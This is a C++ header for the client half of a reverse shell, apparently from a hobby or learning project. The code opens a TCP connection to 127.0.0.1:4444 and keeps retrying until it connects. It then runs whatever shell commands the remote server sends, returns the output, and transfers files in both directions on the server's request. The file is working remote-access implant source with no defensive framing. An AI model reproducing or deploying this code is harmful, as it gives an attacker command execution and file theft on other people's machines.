#ifndef _CLIENT_H_
#define _CLIENT_H_

#define _WIN32_WINDOWS 0x0A00
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <array>
#include <fstream>
#include <boost/asio.hpp>
#include <string>
#include <iostream>
#include <filesystem>
#include <boost/algorithm/string.hpp>
#include <unordered_map>
#include "CommandExecuter.hpp"
#include "../CommonReverseShell/Functions.hpp"

class Client
{
private:
	using IoService = boost::asio::io_service;
	using TcpResolver = boost::asio::ip::tcp::resolver;

public:

	Client(IoService& ioService)
		: m_socket(ioService), m_ShellUtils(this)
	{
		Connect(ioService);
		m_ShellUtils.Start();
	}

private:

	void Connect(IoService& ioService)
	{
		TcpResolver resolver(ioService);
		auto endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });

		while(true)
		{
			boost::asio::connect(m_socket, endpointIterator, m_ShellUtils.m_errorCode);
			if (!m_ShellUtils.m_errorCode)
				return;

			std::cout << "Coudn't connect to server. Check that it is up and listening " << std::endl;
			m_socket.close();
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		std::cout << "Connected to: " << m_socket.remote_endpoint().address().to_string() << std::endl;
	}

	SharedReverseShellUtils<Client>::OperationType ReadOperationType()
	{
		auto operation = m_ShellUtils.Response();
		return m_ShellUtils.GetOperationType(operation);
	}
	
	void Command()
	{
		auto command = m_ShellUtils.Response();
		CommandExecuter commandExecuter;
		auto commandResult = *commandExecuter.RunCommand(command);
		m_ShellUtils.Send(commandResult);
	}

	void Download()
	{
		auto filePath = m_ShellUtils.Response();
		m_file.open(filePath, std::ios::in | std::ios::binary);
		if (!m_file)
			throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!

		auto fileSize = std::filesystem::file_size(filePath);
		m_ShellUtils.Upload(fileSize);
		std::cout << "File uploaded (local): " << filePath << std::endl;
	}

	void Upload()
	{
		auto filePath = m_ShellUtils.Response();

		m_file.open(filePath, std::ios::out | std::ios::binary);
		if (!m_file)
			throw; // TODO - throw specific exception

		m_ShellUtils.Download(filePath);
	}

	void InvalidOperation()
	{
		throw; // TODO - throw specific exception
	}

public: // TODO - Turn this back into private after solving the CommonReverseShell template issues. 
	boost::asio::ip::tcp::socket m_socket;
	SharedReverseShellUtils<Client> m_ShellUtils;
	boost::asio::streambuf m_responseBuf;
	std::fstream m_file;

	friend class SharedReverseShellUtils<Client>;
};

#endif // !_CLIENT_H_
